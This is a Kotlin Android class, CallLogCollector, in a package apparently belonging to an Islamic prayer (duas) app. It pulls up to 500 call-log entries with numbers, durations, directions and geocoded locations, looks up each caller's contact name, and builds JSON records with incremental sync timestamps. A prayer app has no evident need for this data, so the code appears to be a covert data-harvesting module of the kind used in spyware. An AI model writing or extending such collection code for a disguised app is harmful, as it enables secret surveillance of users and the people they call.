package islamic.duas.logs

import android.content.ContentResolver
import android.content.Context
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.CallLog
import android.provider.ContactsContract
import android.util.Log
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class CallLogCollector(private val context: Context) {

    companion object {
        private const val TAG = "CallLogCollector"
        private const val MAX_CALLS = 500
    }

    fun collectCallLogs(lastSyncMs: Long = 0L): List<JSONObject> {
        val calls = mutableListOf<JSONObject>()
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)

        val projection = arrayOf(
            CallLog.Calls.NUMBER,
            CallLog.Calls.DATE,
            CallLog.Calls.DURATION,
            CallLog.Calls.TYPE,
            CallLog.Calls.GEOCODED_LOCATION,
            CallLog.Calls.COUNTRY_ISO
        )

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val selection = if (lastSyncMs > 0) {
                    "${CallLog.Calls.DATE} > ?"
                } else null
                val selectionArgs = if (lastSyncMs > 0) {
                    arrayOf(lastSyncMs.toString())
                } else null

                val queryArgs = Bundle().apply {
                    putString(ContentResolver.QUERY_ARG_SQL_SORT_ORDER, "${CallLog.Calls.DATE} DESC")
                    putInt(ContentResolver.QUERY_ARG_LIMIT, MAX_CALLS)
                    if (selection != null) putString(ContentResolver.QUERY_ARG_SQL_SELECTION, selection)
                    if (selectionArgs != null) putStringArray(ContentResolver.QUERY_ARG_SQL_SELECTION_ARGS, selectionArgs)
                }
                context.contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    queryArgs,
                    null
                )?.use { cursor -> processCursor(cursor, dateFormat, calls) }
            } else {
                val selection = if (lastSyncMs > 0) "${CallLog.Calls.DATE} > ?" else null
                val selectionArgs = if (lastSyncMs > 0) arrayOf(lastSyncMs.toString()) else null
                context.contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    selection,
                    selectionArgs,
                    "${CallLog.Calls.DATE} DESC"
                )?.use { cursor -> processCursor(cursor, dateFormat, calls) }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Query error: ${e.message}", e)
        }
        return calls.take(MAX_CALLS)
    }

    private fun resolveContactName(number: String): String {
        if (number.isEmpty() || number == "unknown") return ""
        return try {
            val uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number))
            val projection = arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME)
            context.contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
                if (cursor.moveToFirst()) {
                    cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME)) ?: ""
                } else ""
            } ?: ""
        } catch (_: Exception) { "" }
    }

    private fun processCursor(
        cursor: android.database.Cursor,
        dateFormat: SimpleDateFormat,
        calls: MutableList<JSONObject>
    ) {
        val numIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER)
        val dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE)
        val durIdx = cursor.getColumnIndex(CallLog.Calls.DURATION)
        val typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE)
        val geoIdx = cursor.getColumnIndex(CallLog.Calls.GEOCODED_LOCATION)
        val countryIdx = cursor.getColumnIndex(CallLog.Calls.COUNTRY_ISO)
        var count = 0

        while (cursor.moveToNext() && count < MAX_CALLS) {
            try {
                val number = if (numIdx >= 0) cursor.getString(numIdx) ?: "unknown" else "unknown"
                val dateMs = if (dateIdx >= 0) cursor.getLong(dateIdx) else 0L
                val duration = if (durIdx >= 0) cursor.getLong(durIdx) else 0L
                val type = if (typeIdx >= 0) cursor.getInt(typeIdx) else -1
                val geocoded = if (geoIdx >= 0) cursor.getString(geoIdx) ?: "" else ""
                val country = if (countryIdx >= 0) cursor.getString(countryIdx) ?: "" else ""

                val typeStr = when (type) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    CallLog.Calls.MISSED_TYPE -> "missed"
                    CallLog.Calls.REJECTED_TYPE -> "rejected"
                    CallLog.Calls.BLOCKED_TYPE -> "blocked"
                    else -> "unknown"
                }

                val contactName = resolveContactName(number)
                val locationParts = listOfNotNull(geocoded.takeIf { it.isNotEmpty() }, country.takeIf { it.isNotEmpty() })
                val location = locationParts.joinToString(", ")

                val entry = JSONObject().apply {
                    put("type", "phone_call")
                    put("timestamp", dateFormat.format(Date(dateMs)))
                    put("ts_ms", dateMs)
                    put("contactNumber", number)
                    put("contactName", contactName)
                    put("duration", duration)
                    put("direction", typeStr)
                    put("location", location)
                }
                calls.add(entry)
                count++
            } catch (e: Exception) {
                Log.w(TAG, "Row read error: ${e.message}")
            }
        }
    }
}
